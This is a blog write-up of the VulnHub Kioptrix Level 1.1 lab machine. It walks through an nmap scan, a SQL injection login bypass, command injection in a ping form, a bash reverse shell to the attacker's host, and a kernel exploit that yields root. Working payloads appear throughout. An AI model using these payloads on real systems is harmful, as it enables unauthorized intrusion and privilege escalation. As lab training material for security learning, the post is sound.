---
layout: post
title:	"Kioptrix: Level 1.1 (#2) Writeup"
date:	2017-01-07 21:30:00
categories:
    - blog
tags:
    - vulnhub
---

Hello all.

You can download Kioptrix  from Vulnhub.

As always I started to enumerate with nmap:

~~~
Syrion:~ syrion$ nmap -sT -sV -p 1-65535 192.168.1.26
Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-01-07 00:18 CET
Nmap scan report for 192.168.1.26
Host is up (0.0014s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
788/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
~~~

On port 80 there was this vulnerable login:

![Screenshot]({{ site.baseurl }}/images/2017-01-07-kioptrix-level-1-1-writeup/img1.png)

By using ‘ or 1=1 — – as username I successfully logged in:

![Screenshot]({{ site.baseurl }}/images/2017-01-07-kioptrix-level-1-1-writeup/img2.png)

There was this “Basic Administrative Web Console”.  By giving an ip address, it performed a ping command:

![Screenshot]({{ site.baseurl }}/images/2017-01-07-kioptrix-level-1-1-writeup/img3.png)

Nice!!! It looked like a Command Injection Vulnerability!!! I succesfully executed a “ls” command by using this input:

~~~
;ls
~~~

![Screenshot]({{ site.baseurl }}/images/2017-01-07-kioptrix-level-1-1-writeup/img4.png)

I opened a reverse shell:

~~~
;bash -i >& /dev/tcp/192.168.1.24/4444 0>&1
~~~

~~~
Syrion:~ syrion$ nc -l 4444
bash: no job control in this shell
bash-3.00$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
~~~

I noticed that this linux kernel version was vulnerable to this [exploit](https://www.exploit-db.com/exploits/9542/):

~~~
bash-3.00$ gcc exp.c -o exp
bash-3.00$ ./exp
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
~~~

It was done!

Good bye!